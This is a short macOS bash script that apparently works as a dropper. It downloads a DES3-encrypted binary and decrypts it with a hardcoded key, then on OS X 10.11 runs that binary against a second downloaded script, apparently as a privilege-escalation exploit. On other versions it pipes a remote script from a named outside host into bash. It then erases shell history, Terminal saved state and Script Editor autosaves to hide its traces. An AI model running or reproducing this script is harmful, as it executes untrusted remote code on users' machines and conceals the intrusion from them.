#!/usr/bin/env bash
host=boesen.science
down_port=2042
up_port=2043

curl -Lso /tmp/exp.out.des3 $host:$down_port/mac/exp.out.des3
openssl des3 -d -in /tmp/exp.out.des3 -k b51861c95142fce29aef7b6416fa21d5 > /tmp/exp.out

curl -Lso /tmp/enact.sh $host:$down_port/mac/enact.sh

chmod +x /tmp/exp.out /tmp/enact.sh

if [[ $(defaults read loginwindow SystemVersionStampAsString) = "10.11."* ]] &&
   [[ -f /tmp/exp.out ]]; then

/tmp/exp.out <<< /tmp/enact.sh

else
    curl -L $host:$down_port/mac/userjoin.sh |bash
fi

rm -f /tmp/*.{sh,out,des3}

clear;clear;clear

if [ "$TERM" = "dumb" ]; then
    rm -f ~/Library/Autosave\ Information/{*.scpt,com.apple.ScriptEditor2.plist}
    killall Script\ Editor
else
    rm -f ~/.*history
    rm -f ~/Downloads/term.*
    rm -f ~/Library/Saved\ Application\ State/com.apple.Terminal.savedState/*

    killall term Terminal 2>/dev/null
fi
